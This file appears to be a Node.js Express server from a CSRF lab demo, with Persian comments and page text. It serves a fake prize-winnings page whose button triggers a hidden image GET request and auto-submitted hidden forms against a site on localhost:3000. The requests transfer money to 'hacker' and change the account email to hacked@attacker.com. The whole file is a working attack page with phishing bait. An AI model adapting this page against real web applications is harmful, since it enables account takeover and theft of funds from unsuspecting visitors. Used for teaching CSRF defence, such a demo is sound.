const express = require('express');
const path = require('path');

const app = express();
app.use(express.static('public'));

// صفحه اصلی مهاجم
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🔥 سایت هدیه ویژه 🔥</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
                .card { background: white; padding: 30px; border-radius: 15px; max-width: 500px; margin: auto; }
                button { background: #ff6b6b; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
                .hidden { display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🎉 تبریک! شما برنده 10 میلیون تومان شده‌اید!</h1>
                <p>برای دریافت جایزه کلیک کنید:</p>
                <button onclick="attack()">دریافت جایزه</button>
                
                <div id="result" style="margin-top: 20px;"></div>
            </div>
            
            <!-- حمله مخفی -->
            <iframe id="hiddenFrame" style="display:none"></iframe>
            
            <script>
                    function attack() {
                    // حمله 1: GET روش Image برای transfer (اگر از GET پشتیبانی کند)
                    const img = new Image();
                    img.src = 'http://localhost:3000/transfer?to=hacker&amount=200';
                    img.style.display = 'none';
                    document.body.appendChild(img);

                    // حمله 2: POST روش فرم خودکار برای change-email
                    const form1 = document.createElement('form');
                    form1.method = 'POST';
                    form1.action = 'http://localhost:3000/change-email';
                    form1.target = 'hiddenFrame';
                    
                    const input1 = document.createElement('input');
                    input1.name = 'email';
                    input1.value = 'hacked@attacker.com';
                    form1.appendChild(input1);
                    
                    document.body.appendChild(form1);
                    form1.submit();

                    // حمله 3: POST روش فرم خودکار برای transfer
                    const form2 = document.createElement('form');
                    form2.method = 'POST';
                    form2.action = 'http://localhost:3000/transfer';
                    form2.target = 'hiddenFrame';
                    
                    const inputTo = document.createElement('input');
                    inputTo.name = 'to';
                    inputTo.value = 'hacker';
                    form2.appendChild(inputTo);
                    
                    const inputAmount = document.createElement('input');
                    inputAmount.name = 'amount';
                    inputAmount.value = '200';
                    form2.appendChild(inputAmount);
                    
                    document.body.appendChild(form2);
                    form2.submit();

                    document.getElementById('result').innerHTML = 
                        '<p style="color:green">✅ حملات انجام شد!</p>' +
                        '<p style="color:red; font-size:12px">(در پس‌زمینه، تغییر ایمیل و انتقال وجه انجام شد)</p>';
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(4000, () => {
    console.log('🔥 سایت مهاجم در: http://localhost:4000');
});